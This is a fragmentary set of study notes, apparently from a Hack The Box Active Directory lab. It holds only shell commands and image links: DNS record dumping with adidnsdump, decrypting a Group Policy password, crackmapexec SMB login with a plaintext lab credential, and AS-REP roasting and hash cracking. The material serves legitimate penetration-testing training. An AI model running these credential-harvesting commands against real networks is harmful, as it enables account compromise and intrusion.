...
![[Z Assets/Images/02f19890c5504958ee3d4d5c39608eb1_MD5.webp]]
...
```shell-session
slomkm@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
...
```shell-session
slomkm@htb[/htb]$ head records.csv 
...
```shell-session
slomkm@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
...
![[Z Assets/Images/c7b2b9ca3001329c0db26b797656576b_MD5.png]]
...
```shell-session
slomkm@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
...
```shell-session
slomkm@htb[/htb]$ crackmapexec smb -L | grep gpp
...
```shell-session
slomkm@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
...
![[Z Assets/Images/a76ff84adef8c811cecba54a0aa27243_MD5.webp]]
...
```shell-session
slomkm@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
...
```shell-session
slomkm@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
...
![[Z Assets/Images/eab7cd5bef90e676625eedab954b0be0_MD5.webp]]
...
![[Z Assets/Images/fe8b168ba57a1b4c14c1ff664e4bc76b_MD5.webp]]
